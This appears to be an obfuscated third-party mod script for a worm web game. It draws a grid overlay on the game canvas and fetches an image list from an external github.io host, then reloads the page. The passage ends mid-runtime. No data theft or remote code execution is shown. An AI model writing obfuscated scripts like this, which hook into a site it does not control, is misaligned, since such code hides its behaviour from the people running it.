window.URLSERV_WORMUP = "https://25yt551.github.io/worm2/";
window.sectorSystem = {
  settings: {
    lineWidth: 0.15,
    lineColor: 16711680,
    lineAlpha: 0.3,
    backgroundColor: 0,
    backgroundAlpha: 0.6,
    sectorTextStyle: {
      fontFamily: "Arial",
      fontSize: 14,
      fill: 16777215
    },
    quarterTextStyle: {
      fontFamily: "Arial",
      fontSize: 20,
      fill: 16777215
    },
    showLines: true
  },
  state: {
    container: null,
    graphics: null,
    isActive: false,
    currentMode: null,
    texts: [],
    initialized: false,
    renderContainer: null,
    restored: false
  },
  findRenderContainer: function () {
    if (this.state.renderContainer) {
      return this.state.renderContainer;
    }
    const _0x1150bc = [() => window.app?.stage, () => window.PIXI?.app?.stage, () => window.gameApp?.stage, () => window.renderer?.stage, () => window._wup?._anApp?.og?.af?.ng?.mf, () => window._1f8817?.og?.af?.ng?.mf, () => window.decoder?.og?.af?.ng?.mf, () => window.game?.renderer?.stage, () => window.game?.scene?.stage, () => {
      for (let _0x247c3b in window) {
        try {
          const _0x429b40 = window[_0x247c3b];
          if (_0x429b40 && typeof _0x429b40 === "object") {
            if (_0x429b40 instanceof PIXI.Container) {
              return _0x429b40;
            }
            if (_0x429b40.stage instanceof PIXI.Container) {
              return _0x429b40.stage;
            }
            if (_0x429b40.mf instanceof PIXI.Container) {
              return _0x429b40.mf;
            }
            if (_0x429b40.og?.af?.ng?.mf instanceof PIXI.Container) {
              return _0x429b40.og.af.ng.mf;
            }
          }
        } catch (_0x1dcec0) {}
      }
      return null;
    }];
    for (let _0x5f056c = 0; _0x5f056c < _0x1150bc.length; _0x5f056c++) {
      try {
        const _0x11c7a1 = _0x1150bc[_0x5f056c]();
        if (_0x11c7a1 && _0x11c7a1 instanceof PIXI.Container) {
          this.state.renderContainer = _0x11c7a1;
          return _0x11c7a1;
        }
      } catch (_0x3f5e86) {}
    }
    return null;
  },
  getRadius: function () {
    const _0x45204b = [() => window._wup?._anApp?.dh?.hh?.zg, () => window._1f8817?.dh?.hh?.zg, () => window.decoder?.dh?.hh?.zg, () => window.game?.radius, () => window.gameRadius, () => window.mapRadius, () => 500];
    for (let _0x4488e0 of _0x45204b) {
      try {
        const _0x64c081 = _0x4488e0();
        if (_0x64c081 && typeof _0x64c081 === "number" && _0x64c081 > 0) {
          return _0x64c081;
        }
      } catch (_0x974381) {}
    }
    return 500;
  },
  clearTexts: function () {
    this.state.texts.forEach(_0x45a0c0 => {
      if (_0x45a0c0 && _0x45a0c0.parent) {
        _0x45a0c0.parent.removeChild(_0x45a0c0);
        try {
          _0x45a0c0.destroy({
            children: true,
            texture: false,
            baseTexture: false
          });
        } catch (_0x49520f) {}
      }
    });
    this.state.texts = [];
  },
  initDrawing: function (_0x3f1c98) {
    this.clearTexts();
    this.state.graphics.clear();
    this.state.graphics.lineStyle(this.settings.lineWidth, this.settings.lineColor, this.settings.lineAlpha);
    this.state.graphics.beginFill(this.settings.backgroundColor, this.settings.backgroundAlpha);
    this.state.graphics.drawCircle(0, 0, _0x3f1c98);
    this.state.graphics.endFill();
    return _0x3f1c98;
  },
  drawSectors: function () {
    const _0x392b87 = this.initDrawing(this.getRadius());
    const _0x27712b = _0x392b87 / 3;
    if (this.settings.showLines) {
      for (let _0x54e10e = 1; _0x54e10e < 3; _0x54e10e++) {
        this.state.graphics.drawCircle(0, 0, _0x392b87 - _0x54e10e * _0x27712b);
      }
      for (let _0x22b602 = 0; _0x22b602 < 4; _0x22b602++) {
        const _0x1d99ac = _0x22b602 * Math.PI / 2;
        this.state.graphics.moveTo(0, 0);
        this.state.graphics.lineTo(Math.cos(_0x1d99ac) * _0x392b87, Math.sin(_0x1d99ac) * _0x392b87);
      }
    }
    for (let _0x4b09af = 0; _0x4b09af < 4; _0x4b09af++) {
      const _0x4c08c9 = _0x4b09af * Math.PI / 2;
      for (let _0x471a20 = 0; _0x471a20 < 3; _0x471a20++) {
        const _0x561af7 = _0x392b87 - (_0x471a20 * _0x27712b + _0x27712b / 2);
        const _0x33f1e9 = _0x4c08c9 + Math.PI / 4;
        const _0x28448e = ["S", "D", "F"][_0x471a20] + (_0x4b09af + 1);
        const _0x1d9440 = new PIXI.Text(_0x28448e, this.settings.sectorTextStyle);
        _0x1d9440.anchor.set(0.5);
        _0x1d9440.position.set(Math.cos(_0x33f1e9) * _0x561af7, Math.sin(_0x33f1e9) * _0x561af7);
        this.state.container.addChild(_0x1d9440);
        this.state.texts.push(_0x1d9440);
      }
    }
  },
  drawQuarters: function () {
    const _0x46155f = this.initDrawing(this.getRadius());
    if (this.settings.showLines) {
      this.state.graphics.moveTo(-_0x46155f, 0);
      this.state.graphics.lineTo(_0x46155f, 0);
      this.state.graphics.moveTo(0, -_0x46155f);
      this.state.graphics.lineTo(0, _0x46155f);
    }
    [{
      n: "UP 1",
      x: 1,
      y: -1
    }, {
      n: "UP 2",
      x: -1,
      y: -1
    }, {
      n: "UP 3",
      x: -1,
      y: 1
    }, {
      n: "UP 4",
      x: 1,
      y: 1
    }].forEach(_0xfe3dc8 => {
      const _0x19aaef = new PIXI.Text(_0xfe3dc8.n, this.settings.quarterTextStyle);
      _0x19aaef.anchor.set(0.5);
      _0x19aaef.position.set(_0xfe3dc8.x * _0x46155f / 3, _0xfe3dc8.y * _0x46155f / 3);
      this.state.container.addChild(_0x19aaef);
      this.state.texts.push(_0x19aaef);
    });
  },
  initGraphics: function () {
    if (this.state.initialized) {
      return true;
    }
    const _0x3433bb = this.findRenderContainer();
    if (!_0x3433bb) {
      return false;
    }
    try {
      this.state.container = new PIXI.Container();
      this.state.graphics = new PIXI.Graphics();
      this.state.container.addChild(this.state.graphics);
      _0x3433bb.addChild(this.state.container);
      if (this.state.container.zIndex !== undefined) {
        this.state.container.zIndex = 10;
      }
      this.state.container.visible = false;
      this.state.initialized = true;
      return true;
    } catch (_0x7a0de8) {
      return false;
    }
  },
  toggleMode: function (_0x4d1fff) {
    if (!this.initGraphics()) {
      return;
    }
    if (this.state.isActive && this.state.currentMode === _0x4d1fff) {
      this.state.container.visible = false;
      this.state.isActive = false;
      this.state.currentMode = null;
      const _0x45a362 = document.getElementById("sector_system_toggle");
      if (_0x45a362) {
        _0x45a362.checked = false;
      }
      this.saveSettings();
      return;
    }
    this.state.isActive = true;
    this.state.currentMode = _0x4d1fff;
    this.state.container.visible = true;
    const _0x27f097 = document.getElementById("sector_system_toggle");
    if (_0x27f097) {
      _0x27f097.checked = true;
    }
    if (_0x4d1fff === "sectors") {
      this.drawSectors();
    } else {
      this.drawQuarters();
    }
    this.saveSettings();
  },
  setupKeyboardEvents: function () {
    const _0x1f6f13 = _0x52a154 => {
      const _0x25df92 = _0x52a154.keyCode || _0x52a154.which;
      const _0x4b5dd7 = _0x52a154.key;
      if (_0x52a154.target.tagName === "INPUT" || _0x52a154.target.tagName === "TEXTAREA") {
        return;
      }
      if (_0x52a154.target.closest(".wup-modal, .wormup-container")) {
        return;
      }
      const _0x16dc84 = {
        83: () => this.toggleMode("sectors"),
        187: () => this.toggleMode("sectors"),
        61: () => this.toggleMode("sectors"),
        88: () => this.toggleMode("quarters")
      };
      if (_0x16dc84[_0x25df92]) {
        _0x52a154.preventDefault();
        _0x16dc84[_0x25df92]();
        if (typeof this.initUserInterface === "function") {
          this.initUserInterface();
        }
      }
    };
    document.addEventListener("keydown", _0x1f6f13);
  },
  saveSettings: function () {
    try {
      const _0x38ce8c = {
        settings: this.settings,
        isActive: this.state.isActive,
        currentMode: this.state.currentMode
      };
      localStorage.setItem("sectorSystemSettings", JSON.stringify(_0x38ce8c));
    } catch (_0x3c0c9b) {}
  },
  loadSettings: function () {
    try {
      const _0x2a21ce = localStorage.getItem("sectorSystemSettings");
      if (_0x2a21ce) {
        const _0x4659a7 = JSON.parse(_0x2a21ce);
        if (_0x4659a7.settings) {
          this.settings = {
            ...this.settings,
            ..._0x4659a7.settings
          };
        }
        this.savedState = {
          isActive: _0x4659a7.isActive || false,
          currentMode: _0x4659a7.currentMode || "sectors"
        };
      }
    } catch (_0x5dea42) {}
  },
  applySettings: function () {
    if (this.state.isActive && this.state.currentMode) {
      if (this.state.currentMode === "sectors") {
        this.drawSectors();
      } else {
        this.drawQuarters();
      }
    }
  },
  init: function () {
    if (typeof PIXI === "undefined") {
      setTimeout(() => this.init(), 1000);
      return;
    }
    this.loadSettings();
    this.setupKeyboardEvents();
    const _0x226f6b = this.initGraphics();
    if (!_0x226f6b) {
      setTimeout(() => this.init(), 1000);
      return;
    }
    setTimeout(() => {
      if (this.savedState && this.savedState.isActive) {
        this.state.isActive = true;
        this.state.currentMode = this.savedState.currentMode;
        this.state.container.visible = true;
        if (this.state.currentMode === "sectors") {
          this.drawSectors();
        } else {
          this.drawQuarters();
        }
        const _0x4c88ac = document.getElementById("sector_system_toggle");
        if (_0x4c88ac) {
          _0x4c88ac.checked = true;
        }
        this.state.restored = true;
      }
    }, 1000);
  },
  initUserInterface: function () {
    if (typeof $ === "undefined") {
      return;
    }
    function _0xf6c0c6(_0x34c276) {
      return "#" + _0x34c276.toString(16).padStart(6, "0");
    }
    function _0x2a57ca(_0x57f325) {
      return parseInt(_0x57f325.replace("#", ""), 16);
    }
    if (!this.state.restored && this.savedState && this.savedState.isActive) {
      this.toggleMode(this.savedState.currentMode || "sectors");
      this.state.restored = true;
    }
    const _0x2c8895 = () => {
      const _0x328862 = $("#sector_system_toggle");
      if (_0x328862.length) {
        _0x328862.prop("checked", this.state.isActive);
      }
      const _0xfce959 = $("#sector_display_mode");
      if (_0xfce959.length) {
        _0xfce959.val(this.state.currentMode || "sectors");
      }
      const _0x1d0fbe = $("#sector_bg_color");
      if (_0x1d0fbe.length) {
        _0x1d0fbe.val(_0xf6c0c6(this.settings.backgroundColor));
      }
      const _0x4788b7 = $("#sector_line_color");
      if (_0x4788b7.length) {
        _0x4788b7.val(_0xf6c0c6(this.settings.lineColor));
      }
      const _0x37f977 = $("#sector_bg_opacity");
      const _0x10195b = $("#sector_bg_opacity_value");
      if (_0x37f977.length && _0x10195b.length) {
        _0x37f977.val(this.settings.backgroundAlpha * 100);
        _0x10195b.text(Math.round(this.settings.backgroundAlpha * 100) + "%");
      }
      const _0x2e062c = $("#sector_line_opacity");
      const _0x5a06a2 = $("#sector_line_opacity_value");
      if (_0x2e062c.length && _0x5a06a2.length) {
        _0x2e062c.val(this.settings.lineAlpha * 100);
        _0x5a06a2.text(Math.round(this.settings.lineAlpha * 100) + "%");
      }
      const _0x2b1c12 = $("#sector_show_lines");
      if (_0x2b1c12.length) {
        _0x2b1c12.prop("checked", this.settings.showLines);
      }
      const _0x4de409 = $("#sector_settings_panel");
      if (_0x4de409.length) {
        if (this.state.isActive) {
          _0x4de409.slideDown(300);
        } else {
          _0x4de409.slideUp(200);
        }
      }
      const _0x252a55 = $("#sector_lines_options");
      if (_0x252a55.length) {
        if (!this.settings.showLines) {
          _0x252a55.slideUp(200);
        } else {
          _0x252a55.slideDown(200);
        }
      }
    };
    $("#sector_system_toggle").off("change").on("change", _0x17cf38 => {
      const _0x12832b = $(_0x17cf38.target).prop("checked");
      if (_0x12832b) {
        const _0x4042a0 = $("#sector_display_mode").val() || "sectors";
        this.toggleMode(_0x4042a0);
      } else if (this.state.isActive) {
        this.toggleMode(this.state.currentMode);
      }
      _0x2c8895();
    });
    $("#sector_display_mode").off("change").on("change", _0x40614a => {
      const _0x4c650d = $(_0x40614a.target).val();
      if (this.state.isActive) {
        this.toggleMode(this.state.currentMode);
        this.toggleMode(_0x4c650d);
        _0x2c8895();
      }
    });
    $("#sector_bg_color").off("change").on("change", _0x4c65bb => {
      this.settings.backgroundColor = _0x2a57ca($(_0x4c65bb.target).val());
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_line_color").off("change").on("change", _0x4ee934 => {
      this.settings.lineColor = _0x2a57ca($(_0x4ee934.target).val());
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_bg_opacity").off("input").on("input", _0x56dde0 => {
      const _0x2da438 = parseInt($(_0x56dde0.target).val()) / 100;
      this.settings.backgroundAlpha = _0x2da438;
      $("#sector_bg_opacity_value").text(Math.round(_0x2da438 * 100) + "%");
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_line_opacity").off("input").on("input", _0x1570d8 => {
      const _0x158ce7 = parseInt($(_0x1570d8.target).val()) / 100;
      this.settings.lineAlpha = _0x158ce7;
      $("#sector_line_opacity_value").text(Math.round(_0x158ce7 * 100) + "%");
      this.applySettings();
      this.saveSettings();
    });
    $("#sector_show_lines").off("change").on("change", _0x5a69f6 => {
      this.settings.showLines = $(_0x5a69f6.target).prop("checked");
      const _0xf591e7 = $("#sector_lines_options");
      if (!this.settings.showLines) {
        _0xf591e7.slideUp(200);
      } else {
        _0xf591e7.slideDown(200);
      }
      this.applySettings();
      this.saveSettings();
    });
    _0x2c8895();
  }
};
setTimeout(() => {
  if (window.sectorSystem && typeof window.sectorSystem.init === "function") {
    window.sectorSystem.init();
  }
}, 1000);
$(document).ready(function () {
  $(".sidebar-item[data-tab='backgrounds']").on("click", function () {
    if (window.sectorSystem && typeof window.sectorSystem.initUserInterface === "function") {
      setTimeout(() => window.sectorSystem.initUserInterface(), 100);
    }
  });
});
window.toggleSectors = () => window.sectorSystem?.toggleMode("sectors");
window.toggleQuarters = () => window.sectorSystem?.toggleMode("quarters");
window.debugSectors = () => window.sectorSystem?.debug();
var savedImages = null;
var savedImageVersion = localStorage.getItem("wupImageVersion");
var cachedImages = localStorage.getItem("wupImages");
if (cachedImages && savedImageVersion) {
  savedImages = cachedImages.split(",");
} else {
  fetch(window.URLSERV_WORMUP + "/store", {
    headers: {
      "Content-Type": "application/json"
    },
    method: "POST",
    body: JSON.stringify({
      img: "i2"
    })
  }).then(async function (_0x21f240) {
    var _0x21e32c = await _0x21f240.json();
    savedImages = _0x21e32c.i.split(".");
    localStorage.setItem("wupImages", savedImages.join(","));
    localStorage.setItem("wupImageVersion", _0x21e32c.vs);
    window.location.reload();
  }).catch(function (_0xc95010) {
    console.error("فشل في تحميل الصور:", _0xc95010);
  });
}
(function () {
  'use strict';

  function _0x1c69e7(_0x102466, _0x2718c5) {
    if (!(_0x102466 instanceof _0x2718c5)) {
      throw new TypeError("Cannot call a class as a function");
    }
  }
  function _0x1a60ae(_0x1624c1, _0x292b35) {
    for (var _0x31d1d3 = 0; _0x31d1d3 < _0x292b35.length; _0x31d1d3++) {
      var _0x51ffb0 = _0x292b35[_0x31d1d3];
      _0x51ffb0.enumerable = _0x51ffb0.enumerable || false;
      _0x51ffb0.configurable = true;
      if ("value" in _0x51ffb0) {
        _0x51ffb0.writable = true;
      }
      Object.defineProperty(_0x1624c1, _0xf931fc(_0x51ffb0.key), _0x51ffb0);
    }
  }
  function _0x3b69b0(_0x293e9b, _0x183eb6, _0x277a02) {
    if (_0x183eb6) {
      _0x1a60ae(_0x293e9b.prototype, _0x183eb6);
    }
    if (_0x277a02) {
      _0x1a60ae(_0x293e9b, _0x277a02);
    }
    Object.defineProperty(_0x293e9b, "prototype", {
      writable: false
    });
    return _0x293e9b;
  }
  function _0x254105(_0x50e2d0, _0x61d81d) {
    var _0x33b60b = Object.keys(_0x50e2d0);
    if (Object.getOwnPropertySymbols) {
      var _0x2940bd = Object.getOwnPropertySymbols(_0x50e2d0);
      if (_0x61d81d) {
        _0x2940bd = _0x2940bd.filter(function (_0x5e6e3b) {
          return Object.getOwnPropertyDescriptor(_0x50e2d0, _0x5e6e3b).enumerable;
        });
      }
      _0x33b60b.push.apply(_0x33b60b, _0x2940bd);
    }
    return _0x33b60b;
  }
  function _0x565fbe(_0x51702d) {
    for (var _0x18330c = 1; _0x18330c < arguments.length; _0x18330c++) {
      var _0x471112 = arguments[_0x18330c] ?? {};
      if (_0x18330c % 2) {
        _0x254105(Object(_0x471112), true).forEach(function (_0x415bee) {
          _0x5078aa(_0x51702d, _0x415bee, _0x471112[_0x415bee]);
        });
      } else if (Object.getOwnPropertyDescriptors) {
        Object.defineProperties(_0x51702d, Object.getOwnPropertyDescriptors(_0x471112));
      } else {
        _0x254105(Object(_0x471112)).forEach(function (_0x5541d6) {
          Object.defineProperty(_0x51702d, _0x5541d6, Object.getOwnPropertyDescriptor(_0x471112, _0x5541d6));
        });
      }
    }
    return _0x51702d;
  }
  function _0x5078aa(_0x341f00, _0x4c001e, _0x50ff8a) {
    if ((_0x4c001e = _0xf931fc(_0x4c001e)) in _0x341f00) {
      Object.defineProperty(_0x341f00, _0x4c001e, {
        value: _0x50ff8a,
        enumerable: true,
        configurable: true,
        writable: true
      });
    } else {
      _0x341f00[_0x4c001e] = _0x50ff8a;
    }
    return _0x341f00;
  }
  function _0xf931fc(_0x57ed21) {
    var _0x528ead = _0x32dd74(_0x57ed21, "string");
    if (_0x1a561c(_0x528ead) == "symbol") {
      return _0x528ead;
    } else {
      return _0x528ead + "";
    }
  }
  function _0x32dd74(_0x436349, _0x1c2241) {
    if (_0x1a561c(_0x436349) != "object" || !_0x436349) {
      return _0x436349;
    }
    var _0x1e3495 = _0x436349[Symbol.toPrimitive];
    if (_0x1e3495 !== undefined) {
      var _0x3c1aca = _0x1e3495.call(_0x436349, _0x1c2241 || "default");
      if (_0x1a561c(_0x3c1aca) != "object") {
        return _0x3c1aca;
      }
      throw new TypeError("@@toPrimitive must return a primitive value.");
    }
    return (_0x1c2241 === "string" ? String : Number)(_0x436349);
  }
  function _0x51aacb() {
    'use strict';

    _0x51aacb = function _0x11f731() {
      return _0x52435d;
    };
    var _0x53711e;
    var _0x52435d = {};
    var _0x50e9e6 = Object.prototype;
    var _0x1f0c7a = _0x50e9e6.hasOwnProperty;
    var _0x3c1b84 = Object.defineProperty || function (_0x1a54f3, _0x52d578, _0x225d4e) {
      _0x1a54f3[_0x52d578] = _0x225d4e.value;
    };
    var _0x45bcc2 = typeof Symbol == "function" ? Symbol : {};
    var _0x5365a0 = Symbol.iterator;
    var _0x13f41b = Symbol.asyncIterator;
    var _0x2c2492 = Symbol.toStringTag;
    function _0x4f7811(_0x1d4979, _0x45090c, _0x405ccd) {
      Object.defineProperty(_0x1d4979, _0x45090c, {
        value: _0x405ccd,
        enumerable: true,
        configurable: true,
        writable: true
      });
      return _0x1d4979[_0x45090c];
    }
    try {
      _0x4f7811({}, "");
    } catch (_0x42f4e7) {
      _0x4f7811 = function _0x242f93(_0x4e2784, _0x23114f, _0x8f914c) {
        return _0x4e2784[_0x23114f] = _0x8f914c;
      };
    }
    function _0x14ce19(_0x3d7e47, _0x226df9, _0x2e25b3, _0x33f1f6) {
      var _0x2efb5b = _0x226df9 && _0x226df9.prototype instanceof _0x4e46be ? _0x226df9 : _0x4e46be;
      var _0x3180aa = Object.create(_0x2efb5b.prototype);
      var _0x1c3987 = new _0x19b4e1(_0x33f1f6 || []);
      _0x3c1b84(_0x3180aa, "_invoke", {
        value: _0x32a536(_0x3d7e47, _0x2e25b3, _0x1c3987)
      });
      return _0x3180aa;
    }
    function _0x24e3c1(_0x49cb18, _0x3fc6de, _0x4caeba) {
      try {
        return {
          type: "normal",
          arg: _0x49cb18.call(_0x3fc6de, _0x4caeba)
        };
      } catch (_0x36e861) {
        return {
          type: "throw",
          arg: _0x36e861
        };
      }
    }
    _0x52435d.wrap = _0x14ce19;
    var _0xc387c3 = "suspendedStart";
    var _0x46cd71 = "suspendedYield";
    var _0x3acb2f = "executing";
    var _0x4af877 = "completed";
    var _0x4fb0c1 = {};
    function _0x4e46be() {}
    function _0x21695f() {}
    function _0x407970() {}
    var _0x1a423e = {};
    _0x4f7811(_0x1a423e, _0x5365a0, function () {
      return this;
    });
    var _0x424bea = Object.getPrototypeOf;
    var _0x5a2967 = _0x424bea && _0x424bea(_0x424bea(_0x47ab27([])));
    if (_0x5a2967 && _0x5a2967 !== _0x50e9e6 && _0x1f0c7a.call(_0x5a2967, _0x5365a0)) {
      _0x1a423e = _0x5a2967;
    }
    var _0xe81981 = _0x407970.prototype = _0x4e46be.prototype = Object.create(_0x1a423e);
    function _0x568d22(_0x2198ea) {
      ["next", "throw", "return"].forEach(function (_0x275bf8) {
        _0x4f7811(_0x2198ea, _0x275bf8, function (_0x1256fe) {
          return this._invoke(_0x275bf8, _0x1256fe);
        });
      });
    }
    function _0x28a404(_0xa55333, _0x31339e) {
      function _0x4f19dd(_0x9b2033, _0x57569d, _0x1f7ed9, _0x146221) {
        var _0x14b421 = _0x24e3c1(_0xa55333[_0x9b2033], _0xa55333, _0x57569d);
        if (_0x14b421.type !== "throw") {
          var _0x4631ea = _0x14b421.arg;
          var _0x3b35fc = _0x4631ea.value;
          if (_0x3b35fc && _0x1a561c(_0x3b35fc) == "object" && _0x1f0c7a.call(_0x3b35fc, "__await")) {
            return _0x31339e.resolve(_0x3b35fc.__await).then(function (_0x6b9212) {
              _0x4f19dd("next", _0x6b9212, _0x1f7ed9, _0x146221);
            }, function (_0x5767e8) {
              _0x4f19dd("throw", _0x5767e8, _0x1f7ed9, _0x146221);
            });
          } else {
            return _0x31339e.resolve(_0x3b35fc).then(function (_0x34d758) {
              _0x4631ea.value = _0x34d758;
              _0x1f7ed9(_0x4631ea);
            }, function (_0x1f0b23) {
              return _0x4f19dd("throw", _0x1f0b23, _0x1f7ed9, _0x146221);
            });
          }
        }
        _0x146221(_0x14b421.arg);
      }
      var _0xd3abbb;
      _0x3c1b84(this, "_invoke", {
        value: function _0xffb46c(_0x3e4a2f, _0x251df0) {
          function _0x5709f6() {
            return new _0x31339e(function (_0x1970ad, _0x2a9db0) {
              _0x4f19dd(_0x3e4a2f, _0x251df0, _0x1970ad, _0x2a9db0);
            });
          }
          return _0xd3abbb = _0xd3abbb ? _0xd3abbb.then(_0x5709f6, _0x5709f6) : _0x5709f6();
        }
      });
    }
    function _0x32a536(_0x174e69, _0x56a9ca, _0x15f41b) {
      var _0x5943fe = _0xc387c3;
      return function (_0x298f7d, _0x24b22c) {
        if (_0x5943fe === _0x3acb2f) {
          throw Error("Generator is currently executing");
        }
        if (_0x5943fe === _0x4af877) {
          if (_0x298f7d === "throw") {
            throw _0x24b22c;
          }
          return {
            value: _0x53711e,
            done: true
          };
        }
        _0x15f41b.method = _0x298f7d;
        _0x15f41b.arg = _0x24b22c;
        while (true) {
          var _0x3314c2 = _0x15f41b.delegate;
          if (_0x3314c2) {
            var _0x5454e3 = _0x302185(_0x3314c2, _0x15f41b);
            if (_0x5454e3) {
              if (_0x5454e3 === _0x4fb0c1) {
                continue;
              }
              return _0x5454e3;
            }
          }
          if (_0x15f41b.method === "next") {
            _0x15f41b.sent = _0x15f41b._sent = _0x15f41b.arg;
          } else if (_0x15f41b.method === "throw") {
            if (_0x5943fe === _0xc387c3) {
              _0x5943fe = _0x4af877;
              throw _0x15f41b.arg;
            }
            _0x15f41b.dispatchException(_0x15f41b.arg);
          } else if (_0x15f41b.method === "return") {
            _0x15f41b.abrupt("return", _0x15f41b.arg);
          }
          _0x5943fe = _0x3acb2f;
          var _0x23a8d7 = _0x24e3c1(_0x174e69, _0x56a9ca, _0x15f41b);
          if (_0x23a8d7.type === "normal") {
            _0x5943fe = _0x15f41b.done ? _0x4af877 : _0x46cd71;
            if (_0x23a8d7.arg === _0x4fb0c1) {
              continue;
            }
            return {
              value: _0x23a8d7.arg,
              done: _0x15f41b.done
            };
          }
          if (_0x23a8d7.type === "throw") {
            _0x5943fe = _0x4af877;
            _0x15f41b.method = "throw";
            _0x15f41b.arg = _0x23a8d7.arg;
          }
        }
      };
    }
    function _0x302185(_0x3da2c7, _0x309500) {
      var _0x34c40f = _0x309500.method;
      var _0xae1003 = _0x3da2c7.iterator[_0x34c40f];
      if (_0xae1003 === _0x53711e) {
        _0x309500.delegate = null;
        if (_0x34c40f !== "throw" || !_0x3da2c7.iterator.return || !(_0x309500.method = "return", _0x309500.arg = _0x53711e, _0x302185(_0x3da2c7, _0x309500), _0x309500.method === "throw")) {
          if (_0x34c40f !== "return") {
            _0x309500.method = "throw";
            _0x309500.arg = new TypeError("Iterator missing required method: '" + _0x34c40f + "' method");
          }
        }
        return _0x4fb0c1;
      }
      var _0x413ec2 = _0x24e3c1(_0xae1003, _0x3da2c7.iterator, _0x309500.arg);
      if (_0x413ec2.type === "throw") {
        _0x309500.method = "throw";
        _0x309500.arg = _0x413ec2.arg;
        _0x309500.delegate = null;
        return _0x4fb0c1;
      }
      var _0x270667 = _0x413ec2.arg;
      if (_0x270667) {
        if (_0x270667.done) {
          _0x309500[_0x3da2c7.resultName] = _0x270667.value;
          _0x309500.next = _0x3da2c7.nextLoc;
          if (_0x309500.method !== "return") {
            _0x309500.method = "next";
            _0x309500.arg = _0x53711e;
          }
          _0x309500.delegate = null;
          return _0x4fb0c1;
        } else {
          return _0x270667;
        }
      } else {
        _0x309500.method = "throw";
        _0x309500.arg = new TypeError("Iterator result must be an object");
        _0x309500.delegate = null;
        return _0x4fb0c1;
      }
    }
    function _0x8ed1ff(_0x1c535b) {
      var _0x2f8826 = {
        tryLoc: _0x1c535b[0]
      };
      if (1 in _0x1c535b) {
        _0x2f8826.catchLoc = _0x1c535b[1];
      }
      if (2 in _0x1c535b) {
        _0x2f8826.finallyLoc = _0x1c535b[2];
        _0x2f8826.afterLoc = _0x1c535b[3];
      }
      this.tryEntries.push(_0x2f8826);
    }
    function _0x415d48(_0x148919) {
      var _0x4c6849 = _0x148919.completion || {};
      _0x4c6849.type = "normal";
      delete _0x4c6849.arg;
      _0x148919.completion = _0x4c6849;
    }
    function _0x19b4e1(_0x287e0b) {
      this.tryEntries = [{
        tryLoc: "root"
      }];
      _0x287e0b.forEach(_0x8ed1ff, this);
      this.reset(true);
    }
    function _0x47ab27(_0x352dda) {
      if (_0x352dda || _0x352dda === "") {
        var _0xafe27e = _0x352dda[_0x5365a0];
        if (_0xafe27e) {
          return _0xafe27e.call(_0x352dda);
        }
        if (typeof _0x352dda.next == "function") {
          return _0x352dda;
        }
        if (!isNaN(_0x352dda.length)) {
          var _0x2928df = -1;
          var _0x47687b = function _0x62bfef() {
            while (++_0x2928df < _0x352dda.length) {
              if (_0x1f0c7a.call(_0x352dda, _0x2928df)) {
                _0x62bfef.value = _0x352dda[_0x2928df];
                _0x62bfef.done = false;
                return _0x62bfef;
              }
            }
            _0x62bfef.value = _0x53711e;
            _0x62bfef.done = true;
            return _0x62bfef;
          };
          return _0x47687b.next = _0x47687b;
        }
      }
      throw new TypeError(_0x1a561c(_0x352dda) + " is not iterable");
    }
    _0x21695f.prototype = _0x407970;
    _0x3c1b84(_0xe81981, "constructor", {
      value: _0x407970,
      configurable: true
    });
    _0x3c1b84(_0x407970, "constructor", {
      value: _0x21695f,
      configurable: true
    });
    _0x21695f.displayName = _0x4f7811(_0x407970, _0x2c2492, "GeneratorFunction");
    _0x52435d.isGeneratorFunction = function (_0x1dc3a5) {
      var _0x18e1d5 = typeof _0x1dc3a5 == "function" && _0x1dc3a5.constructor;
      return !!_0x18e1d5 && (_0x18e1d5 === _0x21695f || (_0x18e1d5.displayName || _0x18e1d5.name) === "GeneratorFunction");
    };
    _0x52435d.mark = function (_0x5de532) {
      if (Object.setPrototypeOf) {
        Object.setPrototypeOf(_0x5de532, _0x407970);
      } else {
        _0x5de532.__proto__ = _0x407970;
        _0x4f7811(_0x5de532, _0x2c2492, "GeneratorFunction");
      }
      _0x5de532.prototype = Object.create(_0xe81981);
      return _0x5de532;
    };
    _0x52435d.awrap = function (_0x4daa3f) {
      return {
        __await: _0x4daa3f
      };
    };
    _0x568d22(_0x28a404.prototype);
    _0x4f7811(_0x28a404.prototype, _0x13f41b, function () {
      return this;
    });
    _0x52435d.AsyncIterator = _0x28a404;
    _0x52435d.async = function (_0xe4fff3, _0xf8f8b8, _0x531384, _0x1b09db, _0x5df36f = Promise) {
      var _0x1d10eb = new _0x28a404(_0x14ce19(_0xe4fff3, _0xf8f8b8, _0x531384, _0x1b09db), _0x5df36f);
      if (_0x52435d.isGeneratorFunction(_0xf8f8b8)) {
        return _0x1d10eb;
      } else {
        return _0x1d10eb.next().then(function (_0x227f31) {
          if (_0x227f31.done) {
            return _0x227f31.value;
          } else {
            return _0x1d10eb.next();
          }
        });
      }
    };
    _0x568d22(_0xe81981);
    _0x4f7811(_0xe81981, _0x2c2492, "Generator");
    _0x4f7811(_0xe81981, _0x5365a0, function () {
      return this;
    });
    _0x4f7811(_0xe81981, "toString", function () {
      return "[object Generator]";
    });
    _0x52435d.keys = function (_0x496756) {
      var _0x4a2ead = Object(_0x496756);
      var _0x2a1257 = [];
      for (var _0x39e374 in _0x4a2ead) {
        _0x2a1257.push(_0x39e374);
      }
      _0x2a1257.reverse();
      return function _0x5d02da() {
        while (_0x2a1257.length) {
          var _0x1eb071 = _0x2a1257.pop();
          if (_0x1eb071 in _0x4a2ead) {
            _0x5d02da.value = _0x1eb071;
            _0x5d02da.done = false;
            return _0x5d02da;
          }
        }
        _0x5d02da.done = true;
        return _0x5d02da;
      };
    };
    _0x52435d.values = _0x47ab27;
    _0x19b4e1.prototype = {
      constructor: _0x19b4e1,
      reset: function _0x31cb5d(_0x5017da) {
        this.prev = 0;
        this.next = 0;
        this.sent = this._sent = _0x53711e;
        this.done = false;
        this.delegate = null;
        this.method = "next";
        this.arg = _0x53711e;
        this.tryEntries.forEach(_0x415d48);
        if (!_0x5017da) {
          for (var _0x5cf493 in this) {
            if (_0x5cf493.charAt(0) === "t" && _0x1f0c7a.call(this, _0x5cf493) && !isNaN(+_0x5cf493.slice(1))) {
              this[_0x5cf493] = _0x53711e;
            }
          }
        }
      },
      stop: function _0x1995f2() {
        this.done = true;
        var _0x3c5a23 = this.tryEntries[0].completion;
        if (_0x3c5a23.type === "throw") {
          throw _0x3c5a23.arg;
        }
        return this.rval;
      },
